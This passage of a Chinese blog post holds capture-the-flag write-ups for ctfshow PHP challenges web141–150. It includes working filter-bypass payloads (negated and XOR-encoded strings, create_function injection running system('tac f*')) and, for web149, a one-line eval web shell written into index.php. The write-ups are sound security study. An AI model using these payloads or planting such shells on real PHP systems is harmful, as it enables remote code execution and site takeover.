class="comment">//不相等</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;240610708&#x27;</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>) ? <span class="string">&#x27;相等&#x27;</span> : <span class="string">&#x27;不相等&#x27;</span>;<span class="comment">//相等</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0x1e240&quot;</span>==<span class="string">&quot;123456&quot;</span> ?  <span class="string">&#x27;相等&#x27;</span> : <span class="string">&#x27;不相等&#x27;</span>;<span class="comment">//相等</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p><a href="https://blog.csdn.net/qq_25258019/article/details/126241210">参考</a></p><p>intval会将非数字字符转换为0</p><p>这里md5(phpinfo())为什么页面还会返回探针，不太懂，难道说eval是先执行内层再执行外层函数？</p><h1 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>需要绕过return</p><p>在v3两边加上-可以绕过return同时不妨碍命令的执行</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230129154405726.png" alt="image-20230129154405726"></p><p>取反绕过匹配的限制！！！！！</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v2=<span class="number">1</span>&amp;v3=-(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">93</span>%<span class="number">8</span>C)-</span><br></pre></td></tr></table></figure></div><h1 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>传个0没什么好说的</p><h1 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>可以用乘号和异或代替</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="number">1</span>&amp;v3=*(<span class="string">&quot;%0c%06%0c%0b%05%0d&quot;</span>^<span class="string">&quot;%7f%7f%7f%7f%60%60&quot;</span>)(<span class="string">&quot;%0b%01%03%00%00&quot;</span>^<span class="string">&quot;%7f%60%60%20%2a&quot;</span>)*</span><br></pre></td></tr></table></figure></div><h1 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>v3长度只能是1，但是解除了对v2的限制</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3=-&amp;v2=(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)</span><br></pre></td></tr></table></figure></div><h1 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h1><p>三目运算符使得payload成立</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br></pre></td></tr></table></figure></div><p>可以执行phpinfo()</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3=?(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5):&amp;v2=<span class="number">1</span></span><br></pre></td></tr></table></figure></div><h1 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>可以使用位运算符|和取反绕过</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v2=<span class="number">1</span>&amp;v3=|(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">9</span>C%DF%D5)|</span><br></pre></td></tr></table></figure></div><h1 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>creat_function,之前一次比赛见过一次</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;echo $a.&quot;123&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">类似于</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>因此往第二个参数后面加某些东西可以实现逃逸</p><p>就是这样</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="number">1</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line">从而执行<span class="title function_ invoke__">phpinfo</span>()命令</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230129174857650.png" alt="image-20230129174857650"></p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get: show=<span class="keyword">echo</span> <span class="number">123</span>;&#125;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac f*&#x27;</span>);<span class="comment">//</span></span><br><span class="line">post: ctf=%<span class="number">5</span>ccreate_function</span><br></pre></td></tr></table></figure></div><p>为什么加%5c?</p><p><strong>在PHP的命名空间默认为<code>\</code>，所有的函数和类都在<code>\</code>这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</strong></p><h1 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>xor:</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//a8fc069a-a114-4c42-bfb1-0527f5aa1ead.challenge.ctf.show/?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%02&quot;^&quot;%7d%60%60%21%28&quot;);</span></span><br></pre></td></tr></table></figure></div><p>之前一直异或不出来，后来发现是编译器的问题qwq</p><h1 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230129190348555.png" alt="image-20230129190348555"></p><p>file_put_contents的用法👆</p><p>直接往里面写</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ctf=index.php</span><br><span class="line">show=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h1 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span 